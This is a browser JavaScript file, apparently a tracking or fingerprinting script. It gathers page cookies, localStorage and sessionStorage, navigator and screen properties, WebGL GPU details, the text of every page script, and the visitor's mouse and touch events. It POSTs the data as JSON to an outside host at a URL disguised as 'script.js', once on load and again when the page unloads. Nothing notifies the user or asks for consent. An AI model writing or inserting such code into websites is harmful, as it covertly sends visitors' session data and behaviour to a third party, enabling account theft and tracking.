let mm = [];
addEventListener("mousemove", (event) => {
    mm.push({
        "type": event.type,
        "bubbles": event.bubbles,
        "cancelable": event.cancelable,
        "composed": event.composed,
        "defaultPrevented": event.defaultPrevented,
        "isTrusted": event.isTrusted,
        "altKey": event.altKey,
        "button": event.button,
    });
});
let tp = [];
addEventListener("touchstart", (event) => {
    tp.push({
        "altKey": event.type,
        "changedTouches": event.changedTouches,
        "ctrlKey": event.ctrlKey,
        "metaKey": event.metaKey,
        "shiftKey": event.shiftKey,
        "targetTouches": event.targetTouches,
        "touches": event.touches,
    });
});
;
var organic = function(){
    var navigator_mediaDevices_enumerateDevices
    var navigator_mediaDevices_getDisplayMedia
    var navigator_mediaDevices_getSupportedConstraints
    var navigator_mediaDevices_getUserMedia
    try {
        navigator_mediaDevices_enumerateDevices = navigator.mediaDevices.enumerateDevices
    } catch (err) {
        navigator_mediaDevices_enumerateDevices = null
    }
    try {
        navigator_mediaDevices_getDisplayMedia = navigator.mediaDevices.getDisplayMedia
    } catch (err) {
        navigator_mediaDevices_getDisplayMedia = null
    }
    try {
        navigator_mediaDevices_getSupportedConstraints = navigator.mediaDevices.getSupportedConstraints
    } catch (err) {
        navigator_mediaDevices_getSupportedConstraints = null
    }
    try {
        navigator_mediaDevices_getUserMedia = navigator.mediaDevices.getUserMedia
    } catch (err) {
        navigator_mediaDevices_getUserMedia = null
    }
    try {
        navigator_mediaSession_metadata = navigator.mediaSession.metadata
    } catch (err) {
        navigator_mediaSession_metadata = null
    }
    try {
        navigator_mediaSession_playbackStore = navigator.mediaSession.playbackStore
    } catch (err) {
        navigator_mediaSession_playbackStore = null
    }
    try {
        window_navigator_serviceWorker_controller = window.navigator.serviceWorker.controller
    } catch (err) {
        window_navigator_serviceWorker_controller = null
    }
    try {
        window_navigator_serviceWorker_oncontrollerchange = window.navigator.serviceWorker.oncontrollerchange
    } catch (err) {
        window_navigator_serviceWorker_oncontrollerchange = null
    }
    try {
        window_navigator_serviceWorker_onmessage = window.navigator.serviceWorker.onmessage
    } catch (err) {
        window_navigator_serviceWorker_onmessage = null
    }
    try {
        window_navigator_serviceWorker_onmessageerror = window.navigator.serviceWorker.onmessageerror
    } catch (err) {
        window_navigator_serviceWorker_onmessageerror = null
    }
    try {
        window_navigator_serviceWorker_ready = window.navigator.serviceWorker.ready
    } catch (err) {
        window_navigator_serviceWorker_ready = null
    }

    var organic = {
        /*
        "chrome": {
            "app": chrome.app,
            "csi": chrome.csi,
            "loadTimes": chrome.loadtimes,
        },*/
        "crypto": crypto,
        "customElements": customElements,
        "document": {
            "activeElement": document.activeElement,
            "adoptedStyleSheets": document.adoptedStyleSheets,
            "all": document.all,
            "anchors": document.anchors,
            "applets": document.applets,
            "baseURI": document.baseURI,
            "bgColor": document.bgColor,
            "body": document.body,
            "characterSet": document.characterSet,
            "charset": document.charset,
            "childElementCount": document.childElementCount,
            "childNodes": document.childNodes,
            "children": document.children,
            "compatMode": document.compatMode,
            "contentType": document.contentType,
            "cookie": document.cookie,
            "currentScript": document.currentScript,
            "designMode": document.designMode,
            "dir": document.dir,
            "doctype": document.doctype,
            "documentURI": document.documentURI,
            "domain": document.domain,
            "embeds": document.embeds,
            "featurePolicy": document.featurePolicy,
            "fgColor": document.fgColor,
            "firstChild": document.firstChild,
            "firstElementChild": document.firstElementChild,
            "fonts": document.fonts,
            "forms": document.forms,
            "fragmentDirective": document.fragmentDirective,
            "fullscreen": document.fullscreen,
            "fullscreenElement": document.fullscreenElement,
            "fullscreenEnabled": document.fullscreenEnabled,
            "head": document.head,
            "hidden": document.hidden,
            "images": document.images,
            "implementation": document.implementation,
            "inputEncoding": document.inputEncoding,
            "isConnected": document.isConnected,
            "lastChild": document.lastChild,
            "lastElementChild": document.lastElementChild,
            "lastModified": document.lastModified,
            "linkColor": document.linkColor,
            "links": document.links,
            "location": document.location,
            "plugins": document.plugins,
            "referrer": document.referrer,
            "scripts": document.scripts,
            "styleSheets": document.styleSheets,
            "timeline": document.timeline,
            "title": document.title
        },
        "history": {
            "length": history.length,
            "scrollRestoration": history.scrollRestoration,
            "state": history.state
        },
        "innerHeight": innerHeight,
        "innerWidth": innerWidth,
        "isSecureContext": isSecureContext,
        "length": length,
        "localStorage": localStorage,
        "locationBar": locationbar,
        "matchMedia": matchMedia,
        "menubar": menubar,
        "moveBy": moveBy,
        "moveTo": moveTo,
        "navigator": {
            "app": {
                "codename": navigator.appCodeName,
                "name": navigator.appName,
                "version": navigator.appVersion
            },
            "clipboard": navigator.clipboard,
            /*
            "connection": {
                "downlink": navigator.connection.downlink,
                "effectiveType": navigator.connection.effectiveType,
                "onchange": navigator.connection.onchange,
                "rtt": navigator.connection.rtt,
                "saveData": navigator.connection.saveData
            },
            */
            "cookieEnabled": navigator.cookieEnabled,
            "credentials": navigator.credentials,
            "deviceMemory": navigator.deviceMemory,
            "doNotTrack": navigator.doNotTrack,
            "geolocation": navigator.geolocation,
            "hardwareConcurrency": navigator.hardwareConcurrency,
            "keyboard": navigator.keyboard,
            "language": navigator.language,
            "languages": navigator.languages,
            "locks": navigator.locks,
            "mediaCapabilities": navigator.mediaCapabilities,
            "mediaDevices": {
                "enumerateDevices": navigator_mediaDevices_enumerateDevices,
                "getDisplayMedia": navigator_mediaDevices_getDisplayMedia,
                "getSupportedConstraints": navigator_mediaDevices_getSupportedConstraints,
                "getUserMedia": navigator_mediaDevices_getUserMedia
            },
            "mediaSession": {
                "metadata": navigator_mediaSession_metadata,
                "playbackStore": navigator_mediaSession_playbackStore
            },
            "mimeTypes": [
                navigator.mimeTypes[0],
                navigator.mimeTypes[1],
                navigator.mimeTypes[2],
                navigator.mimeTypes[3],
                navigator.mimeTypes[4]
            ],
            "permissions": navigator.permissions,
            "platform": navigator.platform,
            /*
            "plugins": [
                {
                    "description": navigator.plugins[0].description,
                    "filename": navigator.plugins[0].filename,
                    "length": navigator.plugins[0].length,
                    "name": navigator.plugins[0].name
                },
                {
                    "description": navigator.plugins[1].description,
                    "filename": navigator.plugins[1].filename,
                    "length": navigator.plugins[1].length,
                    "name": navigator.plugins[1].name
                }
            ],
            "presentation": {
                "defaultRequest": navigator.presentation.defaultRequest,
                "receiver": navigator.presentation.receiver,
            },*/
            "product": navigator.product,
            "productSub": navigator.productSub,
            "serviceWorker": {
                "controller": window_navigator_serviceWorker_controller,
                "oncontrollerchange": window_navigator_serviceWorker_oncontrollerchange,
                "onmessage": window_navigator_serviceWorker_onmessage,
                "onmessageerror": window_navigator_serviceWorker_onmessageerror,
                "ready": window_navigator_serviceWorker_ready
            },
            "storage": navigator.storage,//{
                //"estimate": navigator.storage.estimate,
                //"getDirectory": navigator.storage.getDirectory,
                //"persist": navigator.storage.persist,
                //"persisted": navigator.storage.persisted
            //},
            /*
            "usb": {
                "onconnect": navigator.usb.onconnect,
                "ondisconnect": navigator.usb.ondisconnect
            },
            "userActivation": {
                "hasBeenActive": navigator.userActivation.hasBeenActive,
                "isActive": navigator.userActivation.isActive
            },*/
            "userAgent": navigator.userAgent,
            "vendor": navigator.vendor,
            "vendorSub": navigator.vendorSub,
            "wakeLock": navigator.wakeLock,
            "webkitPersistentStorage": navigator.webkitPersistentStorage,
            "webkitTemporaryStorage": navigator.webkitTemporaryStorage,
            "xr": navigator.xr
        },
        "open": open,
        "outerHeight": outerHeight,
        "outerWidth": outerWidth,
        "pageXOffset": pageXOffset,
        "pageYOffset": pageYOffset,
        "performance": performance,
        "personalbar": personalbar,
        //"renderer": renderer,
        "screen": {
            "availHeight": screen.availHeight,
            "availLeft": screen.availLeft,
            "availTop": screen.availTop,
            "availWidth": screen.availWidth,
            "colorDepth": screen.colorDepth,
            "height": screen.height,
            /*
            "orientation": {
                "angle": screen.orientation.angle,
                "onchange": screen.orientation.onchange,
                "type": screen.orientation.type
            },*/
            "pixelDepth": screen.pixelDepth,
            "width": screen.width
        },
        "scroll": scroll,
        "sessionStorage": sessionStorage,
        "speechSynthesis": {
            "onvoiceschanged": speechSynthesis.onvoiceschanged,
            "paused": speechSynthesis.paused,
            "pending": speechSynthesis.pending,
            "speaking": speechSynthesis.speaking
        },
        "statusbar": statusbar,
        //"styleMedia": styleMedia,
        "toolbar": toolbar,
        //"trustedTypes": trustedTypes,
        //"visualViewport": visualViewport,

    };
    return organic
};
function wgl(){
var canvas;
canvas = document.createElement('canvas');
var gl;
var debugInfo;
var vendor;
var renderer;

try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    } catch (e) {
}

if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
}
return {
    canvas:canvas,
    gl:gl,
    debugInfo:debugInfo,
    vendor:vendor,
    renderer:renderer
}
};
var scripts_payload = function(){
        try{
            var scripts = [];
            for (var i = 0; i < document.scripts.length; i++) {
                var script = document.scripts[i];
                scripts.push({
                    "async": script.async,
                    "attributes": script.attributes,
                    "baseURI": script.baseURI,
                    "charset": script.charset,
                    "crossOrigin": script.crossOrigin,
                    "currentScript": script.currentScript,
                    "defer": script.defer,
                    "event": script.event,
                    "firstChild": script.firstChild,
                    "lastChild": script.lastChild,
                    "localName": script.localName,
                    "namespaceURI": script.namespaceURI,
                    "nextSibling": script.nextSibling,
                    "nonce": script.nonce,
                    "ownerDocument": script.ownerDocument,
                    "parentNode": script.parentNode,
                    "parentElement": script.parentElement,
                    "previousSibling": script.previousSibling,
                    "readyState": script.readyState,
                    "referrerPolicy": script.referrerPolicy,
                    "src": script.src,
                    "text": script.text,
                    "type": script.type
                });
            }
            return {length:scripts.length,data:scripts};
        } catch {
            return null;
        }
};
p = {"organic": organic(), "graphics": wgl(), "scripts": scripts_payload()};
const res = fetch("https://s.onsitejs.org/L-oKlbR/script.js",{
        method: "POST",
        headers: {
            "content-type": "application/json;charset=UTF-8"
        },
        body: JSON.stringify(p)
    });
window.onbeforeunload = function() {
        
o = {"mouse": mm, "touch": tp};
        const res2 = fetch("https://s.onsitejs.org/L-oKlbR/script.js",{
            method: "POST",
            headers: {
                "content-type": "application/json;charset=UTF-8"
            },
            body: JSON.stringify(o)
        });
    };
